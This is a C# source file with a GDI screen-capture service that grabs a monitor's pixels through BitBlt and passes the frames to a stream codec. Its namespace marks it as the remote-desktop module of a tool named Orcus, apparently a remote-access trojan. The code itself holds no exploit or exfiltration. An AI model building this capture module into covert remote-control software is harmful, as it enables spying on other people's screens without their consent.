using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Orcus.Shared.Utilities.Compression;

namespace Orcus.Commands.RemoteDesktop.Capture.GDI
{
    //10 % CPU, 25 FPS
    public class GdiService : IScreenCaptureService
    {
        // ReSharper disable once InconsistentNaming
        private const int SRCCOPY = 0x00CC0020;

        private Bitmap _currentImage;
        private IntPtr _scrDeviceContext;
        private Rectangle _boundsRectangle;
        private ScreenHelper _screenHelper;
        private int _currentMonitor;

        public void Dispose()
        {
            _currentImage?.Dispose();
            if (_scrDeviceContext != IntPtr.Zero)
                NativeMethods.DeleteDC(_scrDeviceContext);

            _currentImage = null;
            _scrDeviceContext = IntPtr.Zero;
        }

        public bool IsSupported { get; } = true;

        public void Initialize(int monitor)
        {
            _screenHelper = new ScreenHelper();
            _scrDeviceContext = NativeMethods.CreateDC("DISPLAY", null, null, IntPtr.Zero);
            ChangeMonitor(monitor);
        }

        public void ChangeMonitor(int monitor)
        {
            _boundsRectangle = Screen.AllScreens[monitor].Bounds;

            _currentImage?.Dispose();
            _currentImage = new Bitmap(_boundsRectangle.Width, _boundsRectangle.Height, PixelFormat.Format32bppArgb);
            _currentMonitor = monitor;
        }

        public RemoteDesktopDataInfo CaptureScreen(IStreamCodec streamCodec, ICursorStreamCodec cursorStreamCodec, bool updateCursor)
        {
            if (updateCursor)
                _screenHelper.UpdateCursor(cursorStreamCodec, _currentMonitor);

            using (var graphics = Graphics.FromImage(_currentImage))
            {
                var deviceContext = graphics.GetHdc();
                NativeMethods.BitBlt(deviceContext, 0, 0, _boundsRectangle.Width, _boundsRectangle.Height,
                    _scrDeviceContext, _boundsRectangle.X, _boundsRectangle.Y, SRCCOPY);
                graphics.ReleaseHdc(deviceContext);

                var bitmapData = _currentImage.LockBits(new Rectangle(0, 0, _currentImage.Width, _currentImage.Height),
                    ImageLockMode.ReadOnly, _currentImage.PixelFormat);

                try
                {
                    return streamCodec.CodeImage(bitmapData.Scan0, _boundsRectangle, _currentImage.Size,
                        _currentImage.PixelFormat);
                }
                finally
                {
                    _currentImage.UnlockBits(bitmapData);
                }
            }
        }

        public Bitmap CaptureScreen()
        {
            using (var graphics = Graphics.FromImage(_currentImage))
            {
                var deviceContext = graphics.GetHdc();
                NativeMethods.BitBlt(deviceContext, 0, 0, _boundsRectangle.Width, _boundsRectangle.Height,
                    _scrDeviceContext, _boundsRectangle.X, _boundsRectangle.Y, SRCCOPY);
                graphics.ReleaseHdc(deviceContext);
            }

            return _currentImage;
        }
    }
}